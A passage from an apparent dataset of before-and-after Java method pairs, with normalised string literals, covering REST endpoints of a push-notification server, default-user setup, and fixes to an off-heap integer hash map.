}","@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response resetMasterSecret(@PathParam(""String_Node_Str"") String pushApplicationID){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp != null) {
    String newMasterSecret=UUID.randomUUID().toString();
    pushApp.setMasterSecret(newMasterSecret);
    pushAppService.updatePushApplication(pushApp);
    return Response.ok(pushApp).build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}"
91254,"@POST @Consumes(MediaType.APPLICATION_JSON) public Response registerPushApplication(PushApplication pushApp){
  try {
    validateModelClass(pushApp);
  }
 catch (  ConstraintViolationException cve) {
    ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
    return builder.build();
  }
  pushApp.setDeveloper(loginName.get());
  pushAppService.addPushApplication(pushApp);
  return Response.created(UriBuilder.fromResource(PushApplicationEndpoint.class).path(String.valueOf(pushApp.getPushApplicationID())).build()).entity(pushApp).build();
}","@POST @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response registerPushApplication(PushApplication pushApp){
  try {
    validateModelClass(pushApp);
  }
 catch (  ConstraintViolationException cve) {
    ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
    return builder.build();
  }
  pushApp.setDeveloper(loginName.get());
  pushAppService.addPushApplication(pushApp);
  return Response.created(UriBuilder.fromResource(PushApplicationEndpoint.class).path(String.valueOf(pushApp.getPushApplicationID())).build()).entity(pushApp).build();
}"
91255,"@DELETE @Path(""String_Node_Str"") public Response deletePushApplication(@PathParam(""String_Node_Str"") String pushApplicationID){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp != null) {
    pushAppService.removePushApplication(pushApp);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}","@DELETE @Path(""String_Node_Str"") @Produces(MediaType.APPLICATION_JSON) public Response deletePushApplication(@PathParam(""String_Node_Str"") String pushApplicationID){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp != null) {
    pushAppService.removePushApplication(pushApp);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}"
91256,"@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) public Response updatePushApplication(@PathParam(""String_Node_Str"") String pushApplicationID,PushApplication updatedPushApp){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp != null) {
    try {
      validateModelClass(pushApp);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    pushApp.setDescription(updatedPushApp.getDescription());
    pushApp.setName(updatedPushApp.getName());
    pushAppService.updatePushApplication(pushApp);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}","@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response updatePushApplication(@PathParam(""String_Node_Str"") String pushApplicationID,PushApplication updatedPushApp){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp != null) {
    try {
      validateModelClass(pushApp);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    pushApp.setDescription(updatedPushApp.getDescription());
    pushApp.setName(updatedPushApp.getName());
    pushAppService.updatePushApplication(pushApp);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}"
91257,"@POST @Consumes(MediaType.APPLICATION_JSON) public Response registerSimplePushVariant(SimplePushVariant simplePushVariant,@PathParam(""String_Node_Str"") String pushApplicationID,@Context UriInfo uriInfo){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp == null) {
    return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  try {
    validateModelClass(simplePushVariant);
  }
 catch (  ConstraintViolationException cve) {
    ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
    return builder.build();
  }
  simplePushVariant.setDeveloper(loginName.get());
  simplePushVariant=(SimplePushVariant)variantService.addVariant(simplePushVariant);
  pushAppService.addSimplePushVariant(pushApp,simplePushVariant);
  return Response.created(uriInfo.getAbsolutePathBuilder().path(String.valueOf(simplePushVariant.getVariantID())).build()).entity(simplePushVariant).build();
}","@POST @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response registerSimplePushVariant(SimplePushVariant simplePushVariant,@PathParam(""String_Node_Str"") String pushApplicationID,@Context UriInfo uriInfo){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp == null) {
    return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  try {
    validateModelClass(simplePushVariant);
  }
 catch (  ConstraintViolationException cve) {
    ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
    return builder.build();
  }
  simplePushVariant.setDeveloper(loginName.get());
  simplePushVariant=(SimplePushVariant)variantService.addVariant(simplePushVariant);
  pushAppService.addSimplePushVariant(pushApp,simplePushVariant);
  return Response.created(uriInfo.getAbsolutePathBuilder().path(String.valueOf(simplePushVariant.getVariantID())).build()).entity(simplePushVariant).build();
}"
91258,"@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) public Response updateSimplePushVariation(@PathParam(""String_Node_Str"") String id,@PathParam(""String_Node_Str"") String simplePushID,SimplePushVariant updatedSimplePushApplication){
  SimplePushVariant spVariant=(SimplePushVariant)variantService.findByVariantIDForDeveloper(simplePushID,loginName.get());
  if (spVariant != null) {
    try {
      validateModelClass(updatedSimplePushApplication);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    spVariant.setName(updatedSimplePushApplication.getName());
    spVariant.setDescription(updatedSimplePushApplication.getDescription());
    variantService.updateVariant(spVariant);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}","@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response updateSimplePushVariation(@PathParam(""String_Node_Str"") String id,@PathParam(""String_Node_Str"") String simplePushID,SimplePushVariant updatedSimplePushApplication){
  SimplePushVariant spVariant=(SimplePushVariant)variantService.findByVariantIDForDeveloper(simplePushID,loginName.get());
  if (spVariant != null) {
    try {
      validateModelClass(updatedSimplePushApplication);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    spVariant.setName(updatedSimplePushApplication.getName());
    spVariant.setDescription(updatedSimplePushApplication.getDescription());
    variantService.updateVariant(spVariant);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}"
91259,"@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) public Response updateAndroidVariation(@PathParam(""String_Node_Str"") String id,@PathParam(""String_Node_Str"") String androidID,AndroidVariant updatedAndroidApplication){
  AndroidVariant androidVariant=(AndroidVariant)variantService.findByVariantIDForDeveloper(androidID,loginName.get());
  if (androidVariant != null) {
    try {
      validateModelClass(updatedAndroidApplication);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    androidVariant.setGoogleKey(updatedAndroidApplication.getGoogleKey());
    androidVariant.setProjectNumber(updatedAndroidApplication.getProjectNumber());
    androidVariant.setName(updatedAndroidApplication.getName());
    androidVariant.setDescription(updatedAndroidApplication.getDescription());
    variantService.updateVariant(androidVariant);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}","@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response updateAndroidVariation(@PathParam(""String_Node_Str"") String id,@PathParam(""String_Node_Str"") String androidID,AndroidVariant updatedAndroidApplication){
  AndroidVariant androidVariant=(AndroidVariant)variantService.findByVariantIDForDeveloper(androidID,loginName.get());
  if (androidVariant != null) {
    try {
      validateModelClass(updatedAndroidApplication);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    androidVariant.setGoogleKey(updatedAndroidApplication.getGoogleKey());
    androidVariant.setProjectNumber(updatedAndroidApplication.getProjectNumber());
    androidVariant.setName(updatedAndroidApplication.getName());
    androidVariant.setDescription(updatedAndroidApplication.getDescription());
    variantService.updateVariant(androidVariant);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}"
91260,"@POST @Consumes(MediaType.APPLICATION_JSON) public Response registerAndroidVariant(AndroidVariant androidVariant,@PathParam(""String_Node_Str"") String pushApplicationID,@Context UriInfo uriInfo){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp == null) {
    return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  try {
    validateModelClass(androidVariant);
  }
 catch (  ConstraintViolationException cve) {
    ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
    return builder.build();
  }
  androidVariant.setDeveloper(loginName.get());
  androidVariant=(AndroidVariant)variantService.addVariant(androidVariant);
  pushAppService.addAndroidVariant(pushApp,androidVariant);
  return Response.created(uriInfo.getAbsolutePathBuilder().path(String.valueOf(androidVariant.getVariantID())).build()).entity(androidVariant).build();
}","@POST @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response registerAndroidVariant(AndroidVariant androidVariant,@PathParam(""String_Node_Str"") String pushApplicationID,@Context UriInfo uriInfo){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp == null) {
    return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  try {
    validateModelClass(androidVariant);
  }
 catch (  ConstraintViolationException cve) {
    ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
    return builder.build();
  }
  androidVariant.setDeveloper(loginName.get());
  androidVariant=(AndroidVariant)variantService.addVariant(androidVariant);
  pushAppService.addAndroidVariant(pushApp,androidVariant);
  return Response.created(uriInfo.getAbsolutePathBuilder().path(String.valueOf(androidVariant.getVariantID())).build()).entity(androidVariant).build();
}"
91261,"@POST @Consumes(MediaType.APPLICATION_JSON) public Response registerChromePackagedAppVariant(ChromePackagedAppVariant chromePackagedAppVariant,@PathParam(""String_Node_Str"") String pushApplicationID,@Context UriInfo uriInfo){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp == null) {
    return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  if (chromePackagedAppVariant.getClientSecret() == null) {
    return Response.status(Response.Status.BAD_REQUEST).build();
  }
  chromePackagedAppVariant.setVariantID(UUID.randomUUID().toString());
  chromePackagedAppVariant.setDeveloper(loginName.get());
  chromePackagedAppVariant=(ChromePackagedAppVariant)variantService.addVariant(chromePackagedAppVariant);
  pushAppService.addChromePackagedAppVariant(pushApp,chromePackagedAppVariant);
  return Response.created(uriInfo.getAbsolutePathBuilder().path(String.valueOf(chromePackagedAppVariant.getVariantID())).build()).entity(chromePackagedAppVariant).build();
}","@POST @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response registerChromePackagedAppVariant(ChromePackagedAppVariant chromePackagedAppVariant,@PathParam(""String_Node_Str"") String pushApplicationID,@Context UriInfo uriInfo){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp == null) {
    return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  if (chromePackagedAppVariant.getClientSecret() == null) {
    return Response.status(Response.Status.BAD_REQUEST).build();
  }
  chromePackagedAppVariant.setVariantID(UUID.randomUUID().toString());
  chromePackagedAppVariant.setDeveloper(loginName.get());
  chromePackagedAppVariant=(ChromePackagedAppVariant)variantService.addVariant(chromePackagedAppVariant);
  pushAppService.addChromePackagedAppVariant(pushApp,chromePackagedAppVariant);
  return Response.created(uriInfo.getAbsolutePathBuilder().path(String.valueOf(chromePackagedAppVariant.getVariantID())).build()).entity(chromePackagedAppVariant).build();
}"
91262,"@DELETE @Path(""String_Node_Str"") public Response removeInstallation(@PathParam(""String_Node_Str"") String variantId,@PathParam(""String_Node_Str"") String installationId){
  InstallationImpl installation=clientInstallationService.findById(installationId);
  if (installation == null) {
    return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  clientInstallationService.removeInstallation(installation);
  return Response.noContent().build();
}","@DELETE @Path(""String_Node_Str"") @Produces(MediaType.APPLICATION_JSON) public Response removeInstallation(@PathParam(""String_Node_Str"") String variantId,@PathParam(""String_Node_Str"") String installationId){
  InstallationImpl installation=clientInstallationService.findById(installationId);
  if (installation == null) {
    return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  clientInstallationService.removeInstallation(installation);
  return Response.noContent().build();
}"
91263,"@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) public Response updateInstallation(InstallationImpl entity,@PathParam(""String_Node_Str"") String variantId,@PathParam(""String_Node_Str"") String installationId){
  InstallationImpl installation=clientInstallationService.findById(installationId);
  if (installation == null) {
    return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  clientInstallationService.updateInstallation(installation,entity);
  return Response.noContent().build();
}","@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response updateInstallation(InstallationImpl entity,@PathParam(""String_Node_Str"") String variantId,@PathParam(""String_Node_Str"") String installationId){
  InstallationImpl installation=clientInstallationService.findById(installationId);
  if (installation == null) {
    return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  clientInstallationService.updateInstallation(installation,entity);
  return Response.noContent().build();
}"
91264,"@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) public Response resetMasterSecret(@PathParam(""String_Node_Str"") String pushApplicationID){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp != null) {
    String newMasterSecret=UUID.randomUUID().toString();
    pushApp.setMasterSecret(newMasterSecret);
    pushAppService.updatePushApplication(pushApp);
    return Response.ok(pushApp).build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}","@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response resetMasterSecret(@PathParam(""String_Node_Str"") String pushApplicationID){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp != null) {
    String newMasterSecret=UUID.randomUUID().toString();
    pushApp.setMasterSecret(newMasterSecret);
    pushAppService.updatePushApplication(pushApp);
    return Response.ok(pushApp).build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}"
91265,"@POST @Consumes(MediaType.APPLICATION_JSON) public Response registerPushApplication(PushApplication pushApp){
  try {
    validateModelClass(pushApp);
  }
 catch (  ConstraintViolationException cve) {
    ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
    return builder.build();
  }
  pushApp.setDeveloper(loginName.get());
  pushAppService.addPushApplication(pushApp);
  return Response.created(UriBuilder.fromResource(PushApplicationEndpoint.class).path(String.valueOf(pushApp.getPushApplicationID())).build()).entity(pushApp).build();
}","@POST @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response registerPushApplication(PushApplication pushApp){
  try {
    validateModelClass(pushApp);
  }
 catch (  ConstraintViolationException cve) {
    ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
    return builder.build();
  }
  pushApp.setDeveloper(loginName.get());
  pushAppService.addPushApplication(pushApp);
  return Response.created(UriBuilder.fromResource(PushApplicationEndpoint.class).path(String.valueOf(pushApp.getPushApplicationID())).build()).entity(pushApp).build();
}"
91266,"@DELETE @Path(""String_Node_Str"") public Response deletePushApplication(@PathParam(""String_Node_Str"") String pushApplicationID){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp != null) {
    pushAppService.removePushApplication(pushApp);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}","@DELETE @Path(""String_Node_Str"") @Produces(MediaType.APPLICATION_JSON) public Response deletePushApplication(@PathParam(""String_Node_Str"") String pushApplicationID){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp != null) {
    pushAppService.removePushApplication(pushApp);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}"
91267,"@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) public Response updatePushApplication(@PathParam(""String_Node_Str"") String pushApplicationID,PushApplication updatedPushApp){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp != null) {
    try {
      validateModelClass(pushApp);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    pushApp.setDescription(updatedPushApp.getDescription());
    pushApp.setName(updatedPushApp.getName());
    pushAppService.updatePushApplication(pushApp);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}","@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response updatePushApplication(@PathParam(""String_Node_Str"") String pushApplicationID,PushApplication updatedPushApp){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp != null) {
    try {
      validateModelClass(pushApp);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    pushApp.setDescription(updatedPushApp.getDescription());
    pushApp.setName(updatedPushApp.getName());
    pushAppService.updatePushApplication(pushApp);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}"
91268,"@POST @Consumes(MediaType.APPLICATION_JSON) public Response registerSimplePushVariant(SimplePushVariant simplePushVariant,@PathParam(""String_Node_Str"") String pushApplicationID,@Context UriInfo uriInfo){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp == null) {
    return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  try {
    validateModelClass(simplePushVariant);
  }
 catch (  ConstraintViolationException cve) {
    ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
    return builder.build();
  }
  simplePushVariant.setDeveloper(loginName.get());
  simplePushVariant=(SimplePushVariant)variantService.addVariant(simplePushVariant);
  pushAppService.addSimplePushVariant(pushApp,simplePushVariant);
  return Response.created(uriInfo.getAbsolutePathBuilder().path(String.valueOf(simplePushVariant.getVariantID())).build()).entity(simplePushVariant).build();
}","@POST @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response registerSimplePushVariant(SimplePushVariant simplePushVariant,@PathParam(""String_Node_Str"") String pushApplicationID,@Context UriInfo uriInfo){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp == null) {
    return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  try {
    validateModelClass(simplePushVariant);
  }
 catch (  ConstraintViolationException cve) {
    ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
    return builder.build();
  }
  simplePushVariant.setDeveloper(loginName.get());
  simplePushVariant=(SimplePushVariant)variantService.addVariant(simplePushVariant);
  pushAppService.addSimplePushVariant(pushApp,simplePushVariant);
  return Response.created(uriInfo.getAbsolutePathBuilder().path(String.valueOf(simplePushVariant.getVariantID())).build()).entity(simplePushVariant).build();
}"
91269,"@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) public Response updateSimplePushVariation(@PathParam(""String_Node_Str"") String id,@PathParam(""String_Node_Str"") String simplePushID,SimplePushVariant updatedSimplePushApplication){
  SimplePushVariant spVariant=(SimplePushVariant)variantService.findByVariantIDForDeveloper(simplePushID,loginName.get());
  if (spVariant != null) {
    try {
      validateModelClass(updatedSimplePushApplication);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    spVariant.setName(updatedSimplePushApplication.getName());
    spVariant.setDescription(updatedSimplePushApplication.getDescription());
    variantService.updateVariant(spVariant);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}","@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response updateSimplePushVariation(@PathParam(""String_Node_Str"") String id,@PathParam(""String_Node_Str"") String simplePushID,SimplePushVariant updatedSimplePushApplication){
  SimplePushVariant spVariant=(SimplePushVariant)variantService.findByVariantIDForDeveloper(simplePushID,loginName.get());
  if (spVariant != null) {
    try {
      validateModelClass(updatedSimplePushApplication);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    spVariant.setName(updatedSimplePushApplication.getName());
    spVariant.setDescription(updatedSimplePushApplication.getDescription());
    variantService.updateVariant(spVariant);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}"
91270,"/** 
 * <p>Loads some users during the <b>first</b> construction.</p>
 */
@PostConstruct public void create(){
  this.identityManager=partitionManager.createIdentityManager();
  this.relationshipManager=partitionManager.createRelationshipManager();
  final String DEFAULT_PASSWORD=""String_Node_Str"";
  User adminUser=buildUser();
  Calendar calendar=expirationDate();
  Password password=new Password(DEFAULT_PASSWORD.toCharArray());
  identityManager.updateCredential(adminUser,password,new Date(),calendar.getTime());
  Role roleDeveloper=new Role(UserRoles.DEVELOPER);
  identityManager.add(roleDeveloper);
  grantRoles(adminUser,roleDeveloper);
}","/** 
 * <p>Loads some users during the <b>first</b> construction.</p>
 */
@PostConstruct public void create(){
  this.identityManager=partitionManager.createIdentityManager();
  this.relationshipManager=partitionManager.createRelationshipManager();
  final String DEFAULT_PASSWORD=""String_Node_Str"";
  final String DEFAULT_USER=""String_Node_Str"";
  User adminUser=SampleModel.getUser(identityManager,DEFAULT_USER);
  if (adminUser == null) {
    adminUser=new User(DEFAULT_USER);
    identityManager.add(adminUser);
    Calendar calendar=expirationDate();
    Password password=new Password(DEFAULT_PASSWORD.toCharArray());
    identityManager.updateCredential(adminUser,password,new Date(),calendar.getTime());
    Role roleDeveloper=new Role(UserRoles.DEVELOPER);
    identityManager.add(roleDeveloper);
    grantRoles(adminUser,roleDeveloper);
  }
}"
91271,"protected String safeBaseUrl(String baseUrl){
  if (baseUrl.endsWith(""String_Node_Str"")) {
    return ""String_Node_Str"" + baseUrl.subSequence(0,baseUrl.lastIndexOf(""String_Node_Str"") - 1);
  }
  return baseUrl;
}","protected String safeBaseUrl(String baseUrl){
  if (baseUrl.endsWith(""String_Node_Str"")) {
    return ""String_Node_Str"" + baseUrl.subSequence(0,baseUrl.lastIndexOf(""String_Node_Str""));
  }
  return baseUrl;
}"
91272,"@Test public void test() throws InterruptedException {
  long startMem=memoryUsed();
  data1.setLongString(""String_Node_Str"");
  assertEquals(""String_Node_Str"",data1.getLongString());
  data7.setLongString(""String_Node_Str"");
  assertEquals(""String_Node_Str"",data7.getLongString());
  System.out.println(""String_Node_Str"");
  threads.execute(new TestTask(data1,""String_Node_Str""));
  threads.execute(new TestTask(data7,""String_Node_Str""));
  threads.shutdown();
  threads.awaitTermination(1,TimeUnit.MINUTES);
  long memUsed=memoryUsed() - startMem;
  assertEquals(1 << 20,memUsed,1 << 20);
}","@Test public void test() throws InterruptedException, ExecutionException {
  long startMem=memoryUsed();
  data1.setLongString(""String_Node_Str"");
  assertEquals(""String_Node_Str"",data1.getLongString());
  data7.setLongString(""String_Node_Str"");
  assertEquals(""String_Node_Str"",data7.getLongString());
  System.out.println(""String_Node_Str"");
  ExecutorService threads=Executors.newFixedThreadPool(2);
  Future<?> a=threads.submit(new TestTask(data1,""String_Node_Str""));
  Future<?> b=threads.submit(new TestTask(data7,""String_Node_Str""));
  a.get();
  b.get();
  threads.shutdown();
  long memUsed=memoryUsed() - startMem;
  System.out.printf(""String_Node_Str"",memUsed / 1024);
  assertEquals(1 << 20,memUsed,1 << 20);
}"
91273,"final void start(){
  executorService.execute(new Runnable(){
    @Override public void run(){
      try {
        process();
      }
 catch (      Exception e) {
        LOG.error(""String_Node_Str"",e);
      }
    }
  }
);
}","final void start(){
  executorService.execute(new Runnable(){
    @Override public void run(){
      try {
        process();
      }
 catch (      ClosedSelectorException e) {
        if (LOG.isDebugEnabled())         LOG.debug(""String_Node_Str"",e);
      }
catch (      Exception e) {
        LOG.error(""String_Node_Str"",e);
      }
    }
  }
);
}"
91274,"@Override public int startSearch(int key){
  if (key == UNSET_KEY)   key=HASH_INSTEAD_OF_UNSET_KEY;
  searchPos=indexToPos(key & capacityMask);
  return searchHash=key;
}","@Override public int startSearch(int key){
  key=maskUnsetKey(key);
  searchPos=indexToPos(key & capacityMask);
  return searchHash=key;
}"
91275,"@Override public void replacePrevPos(int newValue){
  long prevPos=((searchPos - ENTRY_SIZE) & capacityMask2);
  positions.clear(prevPos);
  positions.set(newValue);
  long entry=(((long)searchHash) << 32) | (newValue & 0xFFFFFFFFL);
  bytes.writeLong(prevPos,entry);
}","@Override public void replacePrevPos(int newValue){
  long prevPos=((searchPos - ENTRY_SIZE) & capacityMask2);
  long oldEntry=bytes.readLong(prevPos);
  int oldValue=(int)oldEntry;
  positions.clear(oldValue);
  positions.set(newValue);
  long newEntry=(((long)searchHash) << 32) | (newValue & 0xFFFFFFFFL);
  bytes.writeLong(prevPos,newEntry);
}"
91276,"@Override public boolean replace(int key,int oldValue,int newValue){
  if (key == UNSET_KEY)   key=HASH_INSTEAD_OF_UNSET_KEY;
  long pos=indexToPos(key & capacityMask);
  for (int i=0; i <= capacityMask; i++) {
    long entry=bytes.readLong(pos);
    int hash2=(int)(entry >> 32);
    if (hash2 == key) {
      int value2=(int)entry;
      if (value2 == oldValue) {
        positions.clear(oldValue);
        positions.set(newValue);
        bytes.writeLong(pos,(((long)key) << 32) | (newValue & 0xFFFFFFFFL));
        return true;
      }
    }
 else     if (hash2 == UNSET_KEY) {
      break;
    }
    pos=(pos + ENTRY_SIZE) & capacityMask2;
  }
  return false;
}","@Override public boolean replace(int key,int oldValue,int newValue){
  key=maskUnsetKey(key);
  long pos=indexToPos(key & capacityMask);
  for (int i=0; i <= capacityMask; i++) {
    long entry=bytes.readLong(pos);
    int hash2=(int)(entry >> 32);
    if (hash2 == key) {
      int value2=(int)entry;
      if (value2 == oldValue) {
        positions.clear(oldValue);
        positions.set(newValue);
        bytes.writeLong(pos,(((long)key) << 32) | (newValue & 0xFFFFFFFFL));
        return true;
      }
    }
 else     if (hash2 == UNSET_KEY) {
      break;
    }
    pos=(pos + ENTRY_SIZE) & capacityMask2;
  }
  return false;
}"
91277,"@Override public void put(int key,int value){
  positions.set(value);
  if (key == UNSET_KEY)   key=HASH_INSTEAD_OF_UNSET_KEY;
  long pos=indexToPos(key & capacityMask);
  for (int i=0; i <= capacityMask; i++) {
    long entry=bytes.readLong(pos);
    int hash2=(int)(entry >> 32);
    if (hash2 == UNSET_KEY) {
      bytes.writeLong(pos,(((long)key) << 32) | (value & 0xFFFFFFFFL));
      return;
    }
    if (hash2 == key) {
      int value2=(int)entry;
      if (value2 == value)       return;
    }
    pos=(pos + ENTRY_SIZE) & capacityMask2;
  }
  throw new IllegalStateException(getClass().getSimpleName() + ""String_Node_Str"");
}","@Override public void put(int key,int value){
  key=maskUnsetKey(key);
  long pos=indexToPos(key & capacityMask);
  for (int i=0; i <= capacityMask; i++) {
    long entry=bytes.readLong(pos);
    int hash2=(int)(entry >> 32);
    if (hash2 == UNSET_KEY) {
      bytes.writeLong(pos,(((long)key) << 32) | (value & 0xFFFFFFFFL));
      positions.set(value);
      return;
    }
    if (hash2 == key) {
      int value2=(int)entry;
      if (value2 == value)       return;
    }
    pos=(pos + ENTRY_SIZE) & capacityMask2;
  }
  throw new IllegalStateException(getClass().getSimpleName() + ""String_Node_Str"");
}"
91278,"@Override public boolean remove(int key,int value){
  if (key == UNSET_KEY)   key=HASH_INSTEAD_OF_UNSET_KEY;
  long pos=indexToPos(key & capacityMask);
  long posToRemove=-1;
  for (int i=0; i <= capacityMask; i++) {
    long entry=bytes.readLong(pos);
    int hash2=(int)(entry >> 32);
    if (hash2 == key) {
      int value2=(int)entry;
      if (value2 == value) {
        posToRemove=pos;
